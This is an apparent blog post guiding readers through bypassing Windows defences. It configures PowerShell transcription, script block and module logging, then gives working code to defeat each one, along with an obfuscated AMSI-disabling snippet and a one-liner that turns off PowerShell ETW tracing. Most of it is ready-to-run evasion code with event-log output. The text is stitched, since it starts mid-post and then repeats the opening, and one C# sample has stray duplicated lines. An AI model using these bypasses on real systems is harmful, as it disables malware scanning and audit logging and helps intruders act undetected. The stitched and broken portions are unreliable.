($transcriptionSettings.OutputDirectory) {\n        Write-Host \"Log directory: $($transcriptionSettings.OutputDirectory)\"\n    } else {\n        Write-Host \"Log directory: Default (User's Documents folder, typically $HOME\\Documents)\"\n    }\n    if ($transcriptionSettings.EnableInvocationHeader -eq 1) {\n        Write-Host \"Invocation headers are included in logs.\"\n    }\n} else {\n    Write-Host \"Transcription logging is not enabled via Group Policy.\"\n}\n```\n\nLet's see what this will do\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def26.png\" alt=\"\"></figure>\n\n\nyou can't get the script content here you just get the command and the ouput like a session\n\n>what is the invokation headers , [Patrick](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) explain them here with those screenshots :\n>\n>Transcription Logging without invokation headers activated:\n><figure><img src=\"/images/site/posts/DefenseEvasion/def27.png\" alt=\"\"></figure>\n>The second one shows logging with invokation headers activated:\n><figure><img src=\"/images/site/posts/DefenseEvasion/def28.png\" alt=\"\"></figure>\n{: .prompt-info }\n\n#### PowerShell Transcription Bypass\n\nThis one Doesn't have many resources but there is a one [here](https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass) by [jann lemm](https://avantguard.io/en/blog/author/jann-lemm) , The idea behinde this bypass is the Transcription only check one thing to determine if it's enabled and it's the PowerShell registry (**HKEY\\_LOCAL\\_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription)** or Group Policy to check if **EnableTranscripting is 1**\n\nTo change the key we need an administrative privileges so what should we do ?\n\njann lemm said , If the registry key EnableTranscripting is set to 0 while in an active PowerShell session, the transcript is continued and no bypass is possible, even though the cached value is set to 0. But if these changes to the field are made before a custom PowerShell runspace is opened, the runspace will use the cached (and modified) values, effectively allowing a bypass of the three logging mechanisms by an unprivileged user.\n\nFor the first time i don't understand it , So i will try to explain this more for you in Practical way like the above\n\nSo Let's see how the jann lemm bypass work and how the regular exe work to work Hello World\n\n```c#\n// Hello_World.cs \n\nusing System;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\n\nclass Program\n{\n    static void Main(string[] args)\n    {\n        // Create a default runspace\n        using (Runspace runspace = RunspaceFactory.CreateRunspace())\n        {\n            runspace.Open();\n\n            // Create a pipeline\n            using (Pipeline pipeline = runspace.CreatePipeline())\n            {\n                // Add the command to print \"Hello World\"\n                pipeline.Commands.AddScript(\"Write-Output 'Hello World'\");\n\n                // Execute the pipeline and get results\n                var results = pipeline.Invoke();\n\n                // Display results\n                foreach (PSObject result in results)\n                {\n                    Console.WriteLine(result.ToString());\n                }\n            }\n\n            runspace.Close();\n        }\n    }\n}\n\n            rs.Close();\n        }\n    }\n}\n```\n\n```c#\n// Hello_Bypass.cs # https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass\n\nusing System;\nusing System.Reflection;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\nusing System.Collections.Concurrent;\nusing System.Collections.Generic;\nusing System.Collections.ObjectModel;\n\nnamespace CustomRunspace\n{\n    class CustomRunspace\n    {\n        static void Main(string[] args)\n        {\n            Runspace rs = RunspaceFactory.CreateRunspace();\n\n            // Transcription Logging Bypass\n            BindingFlags bf = BindingFlags.NonPublic | BindingFlags.Static;\n            ConcurrentDictionary<string, Dictionary<string, object>> value = (ConcurrentDictionary<string, Dictionary<string, object>>)rs.GetType().Assembly.GetType(\"System.Management.Automation.Utils\").GetField(\"cachedGroupPolicySettings\", bf).GetValue(null);\n            Dictionary<string, object> dic = new Dictionary<string, object>();\n            dic.Add(\"EnableTranscripting\", \"0\");\n            value.GetOrAdd(\"HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription\", dic);\n\n            // Open Runspace\n            rs.Open();\n\n            PowerShell ps = PowerShell.Create();\n            ps.Runspace = rs;\n            ps.AddCommand(\"Write-Output\").AddArgument(\"Hello World\");\n\n            Collection<PSObject> results = ps.Invoke();\n            foreach (var result in results)\n            {\n                Console.WriteLine(result);\n            }\n\n            rs.Close();\n        }\n    }\n}\n```\n\n> * Runspace (short for \"runtime space\") is an **isolated execution** environment in PowerShell that encapsulates the state and configuration needed to run PowerShell commands or scripts. **It includes session state** (e.g., variables, functions, modules), the PowerShell engine, and the host interface for input/output so it allow PowerShell to execute commands in a controlled, isolated manner, supporting both interactive sessions (like powershell.exe) and programmatic execution\n> * you can compile the cs files with this command :\n>```powershell\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /reference:\"C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll\" /out:Transcription_Bypass.exe CustomRunspace.cs\n```\n{: .prompt-tip }\n\nLet's see what we can do\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def29.png\" alt=\"\"></figure>\n\nSo , When we run the hello\\_world executable the transcription loggin save the commands that in the c# script and the Transcription file created with 53504 Event-ID\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>53504</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>111</Task> \n  <Opcode>10</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-24T01:33:13.9730709Z\" /> \n  <EventRecordID>57</EventRecordID> \n  <Correlation ActivityID=\"{3aa23c01-fc70-0000-906c-a23a70fcdb01}\" /> \n  <Execution ProcessID=\"7140\" ThreadID=\"3408\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-INN3ESD</Computer> \n  <Security UserID=\"S-1-5-21-2346707970-763624724-545999952-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"param1\">7140</Data> \n  <Data Name=\"param2\">DefaultAppDomain</Data> \n  </EventData>\n  </Event>\n```\n\nLet's run the Bypass script with the same Hello\\_World function\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def30.png\" alt=\"\"></figure>\n\nSo, the difference here is that there is no log file. Because the new file runs the custom runspace without any transcription log file.\n\n### Script Block Logging\n\nRecords the code executed, including scripts, functions, and commands, whether invoked interactively or through automation.\n\nLet's configure it from Local Group Policy -> Administrative Templates -> Windows Components -> Windows PowerShell Then navigate to Powershell script block logging\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def31.png\" alt=\"\"></figure>\n\nLet's see how this work , you can run this script to know the Script block logging are on or not\n\n```powershell\n$scriptBlockLogging = Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -ErrorAction SilentlyContinue\nif ($scriptBlockLogging -and $scriptBlockLogging.EnableScriptBlockLogging -eq 1) {\n    Write-Host \"Script Block Logging is enabled.\"\n    if ($scriptBlockLogging.EnableScriptBlockInvocationLogging -eq 1) {\n        Write-Host \"Script block invocation logging is also enabled.\"\n    } else {\n        Write-Host \"Script block invocation logging is not enabled.\"\n    }\n} else {\n    Write-Host \"Script Block Logging is not enabled.\"\n}\n```\n\nlet's start and after that start enum the event's with\n\n```powershell\nGet-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 100 | Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, @{Name=\"ScriptBlock\";Expression={$_.Properties[2].Value}} | Format-List\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def32.png\" alt=\"\"></figure>\n\n>* The Script block get the script content not only the input and the output in the prompt\n>\n>* [PowerShell 5.0 auto logging](https://www.robwillis.info/2019/10/everything-you-need-to-know-to-get-started-logging-powershell) : By default, PowerShell does not log everything and to get the most out of the logging capabilities there are additional policies that need to be enabled. However, it is worth noting that starting with PowerShell 5.0, anything that is determined as ***suspicious*** by AMSI (Antimalware Scan Interface), will automatically log a Script block/4104 event with a level of ***Warning***. [If script block logging is explicitly disabled, these events will not be logged.](https://web.archive.org/web/20180827195417/https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html)\n{: .prompt-info }\n\n\n#### ScriptBlock Bypass\n\nLike the previous bypasses , The user can change his powershell session evniroments and the cached setting so [cobbr](https://web.archive.org/web/20190417131155/https://cobbr.io/ScriptBlock-Logging-Bypass.html) notice that and made this [script](https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407) for us to disable the scriptblock logging\n\n```powershell\n$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').\"GetFie`ld\"('cachedGroupPolicySettings', 'N'+'onPublic,Static')\nIf ($GroupPolicyField) {\n    $GroupPolicyCache = $GroupPolicyField.GetValue($null)\n    If ($GroupPolicyCache['ScriptB'+'lockLogging']) {\n        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0\n        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0\n    }\n    $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()\n    $val.Add('EnableScriptB'+'lockLogging', 0)\n    $val.Add('EnableScriptB'+'lockInvocationLogging', 0)\n    $GroupPolicyCache['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging'] = $val\n}\n```\n\nThen test it with the count of the logs\n\n```powershell\nGet-WinEvent -FilterHashtable @{ProviderName=\"Microsoft-Windows-PowerShell\"; Id=4104} | Measure | % Count\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def33.png\" alt=\"\"></figure>\n\n>Our bypass script will still being logged cuz of [Event Tracing for Windows](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101) you can use this [script here](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32) to disable it\n>```powershell\n[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)\n```\n{: .prompt-tip }\n\n\n### Module Logging\n\nRecords pipeline execution details for <span style=\"color:yellow\">cmdlets from specified modules</span>, including variable initialization and command invocations.\n\nLet's configure it from Local Group Policy -> Administrative Templates -> Windows Components -> Windows PowerShell Then navigate to Module logging\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def34.png\" alt=\"\"></figure>\n\nLet's see how this work , you can run this script to know the Module logging are on or not\n\n```powershell\n$moduleLogging = Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\" -ErrorAction SilentlyContinue\nif ($moduleLogging -and $moduleLogging.EnableModuleLogging -eq 1) {\n    Write-Host \"Module Logging is enabled.\"\n    $moduleNames = Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames\" -ErrorAction SilentlyContinue\n    if ($moduleNames) {\n        Write-Host \"Modules being logged:\"\n        $moduleNames.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' -and $_.Name -ne 'PSParentPath' } | ForEach-Object {\n            Write-Host \" - $($_.Name) = $($_.Value)\"\n        }\n    } else {\n        Write-Host \"No specific modules are configured for logging.\"\n    }\n} else {\n    Write-Host \"Module Logging is not enabled.\"\n}\n```\n\nlet's start and after that start enum the event's with\n\n\n```powershell\nGet-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 100 | Where-Object { $_.Id -eq 4103 } | Select-Object TimeCreated, @{Name=\"Command\";Expression={$_.Properties[1].Value}}, @{Name=\"Module\";Expression={$_.Properties[0].Value}} | Format-List\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def35.png\" alt=\"\"></figure>\n\n\n\n#### Module Logging Bypass\n\nLet's start with a simple event like print a string with write-host\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def36.png\" alt=\"\"></figure>\n\n\nThis simple command trigger 4 events let's discribe them\n\n* PSConsoleHostReadLine : This log appears when you enter the command, as the PSReadLine module handles input reading, providing features like auto-completion and syntax highlighting.\n\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>4103</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>106</Task> \n  <Opcode>20</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-20T23:17:27.8187082Z\" /> \n  <EventRecordID>285</EventRecordID> \n  <Correlation ActivityID=\"{188710b5-f9b6-0000-6a3a-8718b6f9db01}\" /> \n  <Execution ProcessID=\"2236\" ThreadID=\"7736\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-47K3P38</Computer> \n  <Security UserID=\"S-1-5-21-3540393959-771636146-431249527-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"ContextInfo\">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 17 Command Name = PSConsoleHostReadLine Command Type = Function Script Name = Command Path = Sequence Number = 46 User = DESKTOP-47K3P38\\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> \n  <Data Name=\"UserData\" /> \n  <Data Name=\"Payload\">CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"</Data> \n  </EventData>\n  </Event>\n```\n\n* Write-Host : This directly logs the command you executed, showing the invocation and the parameter \"@N1NJ10 was here\".\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>4103</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>106</Task> \n  <Opcode>20</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-20T23:17:27.8234848Z\" /> \n  <EventRecordID>286</EventRecordID> \n  <Correlation ActivityID=\"{188710b5-f9b6-0002-d13b-8718b6f9db01}\" /> \n  <Execution ProcessID=\"2236\" ThreadID=\"7736\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-47K3P38</Computer> \n  <Security UserID=\"S-1-5-21-3540393959-771636146-431249527-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"ContextInfo\">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 18 Command Name = Write-Host Command Type = Cmdlet Script Name = Command Path = Sequence Number = 48 User = DESKTOP-47K3P38\\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> \n  <Data Name=\"UserData\" /> \n  <Data Name=\"Payload\">CommandInvocation(Write-Host): \"Write-Host\" ParameterBinding(Write-Host): name=\"Object\"; value=\"@N1NJ10 was here\"</Data> \n  </EventData>\n  </Event>\n```\n\n* Out-Default : This is likely logged when the prompt is displayed after your command, as PowerShell uses Out-Default to handle the prompt output, even if Write-Host doesn't produce pipeline output.\n\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>4103</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>106</Task> \n  <Opcode>20</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-20T23:17:27.8238426Z\" /> \n  <EventRecordID>287</EventRecordID> \n  <Correlation ActivityID=\"{188710b5-f9b6-0002-d03b-8718b6f9db01}\" /> \n  <Execution ProcessID=\"2236\" ThreadID=\"7736\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-47K3P38</Computer> \n  <Security UserID=\"S-1-5-21-3540393959-771636146-431249527-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"ContextInfo\">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 18 Command Name = Command Type = Script Script Name = Command Path = Sequence Number = 50 User = DESKTOP-47K3P38\\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> \n  <Data Name=\"UserData\" /> \n  <Data Name=\"Payload\">CommandInvocation(Out-Default): \"Out-Default\"</Data> \n  </EventData>\n  </Event>\n```\n\n* Set-StrictMode : This is called by the PSReadLine module, possibly as part of its configuration or internal operations, **and is captured because module logging is enabled for the session. ( So this mean if u call any cmdlet this Event log will be triggered )**\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>4103</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>106</Task> \n  <Opcode>20</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-20T23:17:27.8268015Z\" /> \n  <EventRecordID>288</EventRecordID> \n  <Correlation ActivityID=\"{188710b5-f9b6-0000-af3a-8718b6f9db01}\" /> \n  <Execution ProcessID=\"2236\" ThreadID=\"7736\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-47K3P38</Computer> \n  <Security UserID=\"S-1-5-21-3540393959-771636146-431249527-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"ContextInfo\">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 20 Command Name = Set-StrictMode Command Type = Cmdlet Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1 Command Path = Sequence Number = 52 User = DESKTOP-47K3P38\\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> \n  <Data Name=\"UserData\" /> \n  <Data Name=\"Payload\">CommandInvocation(Set-StrictMode): \"Set-StrictMode\" ParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"</Data> \n  </EventData>\n  </Event>\n```\n\nSo the write-host cmdlet make 3 event logs ( Write-Host , Out-Default , Set-StrictMode ) so if we success to disable the Module logging we will see 1 event , Let's do it\n\nIn this blog by [HUBBL3](https://bc-security.org/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/) , We can see that it's not possible to completely block module logging for all modules (even if we use `*` to include all modules in logging). However, it is possible to bypass logging for specific cmdlets\n\n>* When the [**LogPipelineExecutionDetails**](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events)property value is `$true`, Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer. The setting is effective only in the current session.\n>* A PowerShell snap-in is a .NET assembly (typically a DLL) that contains a collection of cmdlets, providers, and sometimes other components that extend PowerShell‚Äôs functionality.\n>* The \"4103\" Event-ID is for the Module loggin\n>* Path for the Events : Event Viewer -> Applications and Services -> Microsoft -> Windows -> PowerShell -> Operational\n{: .prompt-info }\n\n```powershell\n# Recon\n(Get-Command Write-Host).module\nGet-PSSnapin\n\n# Bypass 1 \n$module = Get-Module Microsoft.PowerShell.Utility\n$module.LogPipelineExecutionDetails = $false\n$Snapin = Get-PSSnapin Microsoft.PowerShell.Core\n$Snapin.LogPipelineExecutionDetails = $false\n\n# Bypass 2 \n\n$GroupPolicy =[ReF].assembly.GetType('System.Management.Automation.Utils').GetFielD('cachedGroupPolicySettings','NonPublic,Static').GetValue($nULL);\n$val=[Collections.Generic.Dictionary[String,System.Object]]::new();\n$Val.Add('EnableModuleLogging',0);\n$Val.add('ModuleNames', '');\n$GroupPolicy['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging']=$VaL\nImport-Module Microsoft.Powershell.Utility -Force\n\n# Bypass 3 \n\n$Cmd = [System.Management.Automation.CmdletInfo]::new(\"Write-Host\", [Microsoft.PowerShell.Commands.WriteHostCommand])\n\n# Test \n\nWrite-Host \"@N1NJ10 was here\"\n\n# Test for Bypass 3 \n\n& $Cmd \"@N1NJ10 was here\"\n```\n\nLet's see what event that the first bypass will trigger\n\nWith the logic we can count them without any execute , They are 4 lines 2 of them execute a change in the session without any output so there will be\n\n* 4 From the PSConsoleHostReadLine\n* 2 From an unknown Events ( Like the Write-Host ... )\n\nLet's see\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def37.png\" alt=\"\"></figure>\n\nAs we expect there are 6 events trigger ( 2 of them are warrning with Event-ID 4104 )\n\n>* Don't Forget to Clear the logs after some operations to see what the new operations new logs\n>* If you use script block you will get 2 events\n{: .prompt-tip }\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def38.png\" alt=\"\"></figure>\n\nSo , Let's test to see if this work\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def39.png\" alt=\"\"></figure>\n\nGreat , It worked the Write-Host now tigger 1 Event log ( PSConsoleHostReadLine )\n\n## Resources\n\nI don't talk about automated tools because you can find many writeups talking about them but in the future, I will update this post with some tools that I use in my engagement and some scenarios\n\nI will provide you with some of these resources enjoy :\n\n* [Amsi.fail](https://amsi.fail/)\n* [Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)\n* [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)\n* [PowerShell get information about AntiVirus](https://answers.microsoft.com/en-us/windowserver/forum/all/powershell-get-information-about-antivirus/9207ebfa-ff97-48f0-b133-dde4cfd4abca)\n* [Beginners-Guide-to-Obfuscation](https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation/blob/main/Exercise%202/Sample_1.ps1)\n* [Evading Detection: A Beginner's Guide to Obfuscation - 2022](https://www.youtube.com/watch?v=wvKwk1wcXvM&list=PLqyUgadpThTJVR6I3FQSBE3mLElxQkcbh&t=1457s)\n* [A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)\n* [the hacker recipes obfuscation](https://www.thehacker.recipes/evasion/av/obfuscation)\n* [AMSITrigger](https://github.com/RythmStick/AMSITrigger)\n* [gocheck](https://github.com/gatariee/gocheck)\n* [AMSI BYPASS AND EVASION](https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/)\n* [AMSI Bypass Memory Patch Technique in 2024](https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b)\n* [amsi-bypass-methods](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)\n* [lolbas-project](https://lolbas-project.github.io/)\n* [The Internals of AppLocker](https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html)\n* [Windows Applocker Policy ‚Äì A Beginner‚Äôs Guide](https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/)\n* [persistence-amsi](https://pentestlab.blog/2021/05/17/persistence-amsi/)\n* [Constrained Language constrain?](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/#what-does-constrained-language-constrain) - [What is PowerShell Constrained Language?](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)\n* [InstallUtil](https://www.ired.team/offensive-security/code-execution/t1118-installutil)\n* [WhiteListEvasion](https://github.com/khr0x40sh/WhiteListEvasion)\n* [NetCat64](https://github.com/vinsworldcom/NetCat64/releases)\n* [CLM-Bypass](https://sp00ks-git.github.io/posts/CLM-Bypass/)\n* [AaronLocker](https://github.com/microsoft/AaronLocker)\n* [one-thousand-and-one-application-blocks](https://blog.improsec.com/tech-blog/one-thousand-and-one-application-blocks)\n* [sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)\n* [Stracciatella](https://github.com/mgeeky/Stracciatella)\n* Manual Pages ","source":"_posts/Evasion.md","raw":"---\ntitle: \"Windows Defense Evasion Guide\"\ndate: 2025-12-01\ncategories: \n    - Network\ntags: \n    - Evasion\n    - Windows\ndescription: \"In this blog post, I explored various Windows defensive mechanisms, configured them, and then demonstrated techniques to bypass them.\"\ncover: /images/site/posts/DefenseEvasion/Evasion.jpg\n---\n\n## Antimalware Scan Interface [ AMSI ]\n\nAntimalware Scan Interface [ AMSI ] is. Microsoft developed it to provide a set of API calls for applications, including any third-party applications, to perform a <span style=\"color:yellow\">signature-based scan of the content</span>.\n\nWindows Defender uses it to scan PowerShell scripts, .NET, VBA macros, Windows Script Host (WSH), VBScript, and JavaScript to detect common malware. The important thing about AMSI is that you do not need to deploy it; it has been there since Windows 10.\n\nSo how does AMSI work :\n\n* When AMSI is invoked, <span style=\"color:yellow\">AMSI.dll</span> is loaded into the application‚Äôs memory.\n* The key functions within AMSI.dll include `AmsiScanBuffer` and `AmsiInitialize`.\n* If the content is clear it will return 1 means the script will be executed\n\nLet's see :\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def.png\" alt=\"\"></figure>\n\n\nlet's see what Windows version is Copy\nthat is running and what antivirus software that is installed\n\n\n```powershell\nPS C:\\Users\\matio> Get-WmiObject Win32_OperatingSystem | Select PSComputerName, Caption, Version | fl\n\nPSComputerName : ATTACKER\nCaption        : Microsoft Windows 10 Pro\nVersion        : 10.0.19045\n\nPS C:\\Users\\matio> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct\n\ndisplayName              : Bitdefender Antivirus\ninstanceGuid             : {0F59B032-EA77-E3A8-2382-74A4346E5522}\npathToSignedProductExe   : C:\\Program Files\\Bitdefender\\Bitdefender Security\\wscfix.exe\npathToSignedReportingExe : C:\\Program Files\\Bitdefender\\Bitdefender Security\\wsccommunicator.exe\nproductState             : 266240\nPSComputerName           :\n\ndisplayName              : Windows Defender\ninstanceGuid             : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}\npathToSignedProductExe   : windowsdefender://\npathToSignedReportingExe : %ProgramFiles%\\Windows Defender\\MsMpeng.exe\nproductState             : 393472\nPSComputerName           :\n```\n\nLet's test AMSI\n\n```powershell\nPS C:\\Users\\matio> Invoke-Mimikatz\nAt line:1 char:1\n+ Invoke-Mimikatz\n+ ~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent\n\nPS C:\\Users\\matio> \"Invoke\"+\"Mimikatz\"\nInvokeMimikatz\n```\n\nOkay AMSI works well let's try to see several ways to bypass it [ I will explain it in depth so bring ur coffee ]\n\n### Error Forcing\n\nError forcing to bypass AMSI (Antimalware Scan Interface) is a technique used by attackers to <span style=\"color:yellow\">manipulate errors in a way that causes AMSI to fail, effectively bypassing its scanning functionality</span> , The idea is to exploit weaknesses or specific conditions that prevent AMSI from successfully scanning the content, thereby allowing potentially malicious scripts to execute without being detected.\n\nLet's see an example , and break it into lines\n\n\n\n```powershell\n$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'\n$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))\n$field = $assembly.GetField(('am{0}InitFailed' -f \n$c),'NonPublic,Static')\n$field.SetValue($null,$true)\n```\n\n* $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'\n\n\n```powershell\n$w = 'System.Management.Automation.A'\n$c = 'si'\n$m = 'Utils'\n```\n\nWe have 3 variables here $w , $c , $m if u combine them u will get `System.Management.Automation.AmsiUtils` but what is it ?\n\n`System.Management.Automation.AmsiUtils` is a class within the .NET framework that is part of the `System.Management.Automation` namespace.\n\nThe primary purpose of `System.Management.Automation.AmsiUtils` is to provide utilities for interacting with AMSI. <span style=\"color:yellow\">It allows PowerShell scripts to be scanned for malicious content by the antivirus software before execution, helping to prevent the execution of malicious scripts</span>.\n\n* $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))\n\nLet's see it in a good way without variables\n\n\n```powershell\n$assembly = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils'))\n```\n\nSo what does that mean ?\n\nIn the context of AMSI bypass techniques, obtaining the type information for `System.Management.Automation.AmsiUtils` is crucial because it allows you to interact with the internal fields and methods of this class, which are not accessible through regular PowerShell commands. By using 